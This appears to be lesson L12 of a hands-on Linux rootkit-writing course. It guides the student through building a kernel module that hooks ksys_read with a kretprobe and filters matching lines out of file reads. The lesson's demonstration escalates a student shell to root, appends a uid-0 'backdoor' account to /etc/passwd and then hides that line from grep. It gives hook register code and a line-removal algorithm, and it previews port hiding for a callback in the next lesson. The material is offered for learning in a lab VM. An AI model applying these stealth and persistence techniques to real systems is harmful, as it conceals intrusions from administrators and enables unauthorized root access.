# L12: Hide Matching Lines from File Reads

## Mission

L11 removed directory entries before userspace could inspect them.
L12 applies the same return-path idea to text reads: remove every returned line
that contains a selected string while leaving the underlying file unchanged.

By the end of the exercise, these two commands are symmetric:

```console
root@victim:~# mkdir rklings.h.c.secret_token
root@victim:~# mkdir rklings.u.c.secret_token
```

The first command hides matching lines from ordinary reads.
The second removes the exact target and restores those lines.

## What you will observe

After implementing the filter, use the control plane from L06 to elevate the
student shell and append a visible account record:

```console
student@victim:~$ mkdir rklings.e
student@victim:~$ id
uid=0(root) ...
root@victim:~# echo 'backdoor:x:0:0::/root:/bin/bash' >> /etc/passwd
root@victim:~# grep backdoor /etc/passwd
backdoor:x:0:0::/root:/bin/bash
```

Then hide that line:

```console
root@victim:~# mkdir rklings.h.c.backdoor
root@victim:~# grep backdoor /etc/passwd
```

An empty result means the line is filtered from the read buffer.
The file on disk is unchanged.

## Workspace

```text
exercises/L12-content-filter
├── Kbuild
└── main.c
```

`main.c` is the only editable file.
The workspace already contains:

- The `mkdir` and `mkdirat` interception used by the control plane.
- Command routing for `h.c` and `u.c`.
- The module and target-list types.
- A declared `ksys_read` kretprobe.
- TODO markers at every implementation point.

You implement the target-list operations, read filtering, and probe lifecycle.

## How the filter works

`read(fd, buf, count)` returns file bytes in a userspace buffer.
A kretprobe lets the module remember that buffer before `ksys_read` runs and
rewrite it after the kernel has filled it.

```text
cat /etc/passwd
        |
        v
ksys_read(fd, user_buffer, count)
        |
        | entry: remember user_buffer and count
        v
kernel copies file data into user_buffer
        |
        | return: copy returned bytes into a kernel buffer
        |         remove complete matching lines
        |         copy the shorter result back
        |         replace the read return value
        v
cat receives only the remaining bytes
```

## TODOs

```text
TODO 1  main.c:26:1   complete the target list and line matcher
TODO 2  main.c:47:2   capture the read buffer
TODO 3  main.c:53:2   filter the returned bytes
TODO 4  main.c:195:2  register probes with rollback
TODO 5  main.c:202:2  unregister probes in reverse
```

### TODO 1 -- `main.c:26:1` -- Complete the target list and line matcher

Implement `rk_target_add` and `rk_target_remove` using the spinlock already in
`struct rk_target_list`.

- Reject additions after `RK_TARGET_MAX` with `-ENOSPC`.
- Copy targets with `strscpy`.
- Remove only an exact string match.
- Close the array gap with `memmove`.
- Return `-ENOENT` when the requested target is absent.

Then implement `line_matches`.
It must return true when any registered target occurs anywhere inside the
bounded line. `strnstr(haystack, needle, len)` searches at most `len` bytes for
a substring, so it works on buffers that are not null-terminated.

### TODO 2 -- `main.c:47:2` -- Capture the read buffer

`ksys_read` is a regular kernel function, not a syscall wrapper.
Its arguments are directly in the probe registers:

```c
data->ubuf = (void __user *)regs->si;
data->count = (size_t)regs->dx;
```

Do not use `regs_get_kernel_argument` here.
That extra indirection was required for the syscall wrapper in L11, but it would
treat unrelated data as registers in this hook.

### TODO 3 -- `main.c:53:2` -- Filter the returned bytes

Start with the actual return value from `regs_return_value(regs)`.
Return immediately when `total <= 0` or no content targets are registered.

After allocating `total` bytes with `kmalloc` and `GFP_KERNEL`, copy the
userspace bytes into the kernel buffer.
Walk the returned data one line at a time. `memchr(ptr, '\n', remaining)` finds
the next newline:

```c
nl = memchr(pos, '\n', remaining);
line_len = nl ? nl - pos + 1 : remaining;
```

When `line_matches` is true:

- Move the remaining bytes over that line with `memmove` and reduce `new_total`
- Do not advance `pos` after removal because a new line now begins at the same
  address
- Advance by `line_len` only when the line remains

After the walk:

- If the size changed, copy `new_total` bytes back and replace the return value
  with `regs_set_return_value`
- If `copy_to_user` fails, return `-EFAULT` instead of reporting bytes that were
  not delivered
- Always free the kernel buffer

### TODO 4 -- `main.c:195:2` -- Register probes with rollback

Initialize the target-list lock, then register `read_probe`, `rk_mkdir_probe`,
and `rk_mkdirat_probe` in order.
If registration fails, unregister only the probes that succeeded.

### TODO 5 -- `main.c:202:2` -- Unregister probes in reverse

Module exit unregisters all three in reverse order.

## Scope of this filter

This implementation filters complete lines present in one returned read buffer.
A line split across two separate reads may not be matched.
Later integration exercises restrict the applicable file reads and verify that
terminal, pipe, socket, and executable streams remain intact.

## Test it

After implementing the TODOs, rebuild and restart the exercise:

```console
$ ./rklings run L12
```

Inside the guest:

```console
root@victim:~# mkdir rklings.e
root@victim:~# echo 'backdoor:x:0:0::/root:/bin/bash' >> /etc/passwd
root@victim:~# grep backdoor /etc/passwd
backdoor:x:0:0::/root:/bin/bash
root@victim:~# mkdir rklings.h.c.backdoor
root@victim:~# grep backdoor /etc/passwd
root@victim:~# mkdir rklings.u.c.backdoor
root@victim:~# grep backdoor /etc/passwd
backdoor:x:0:0::/root:/bin/bash
```

## Validate

```console
$ ./rklings validate L12
  [+] Matching line removed from read output
  [+] Unhidden string reappears in output
  [+] Non-matching reads pass through unchanged
  PASS
```

## Next

The account record can now disappear from ordinary inspection, but a listening
callback still appears in the host's network tables.
L13 hides a selected port while the service remains reachable.
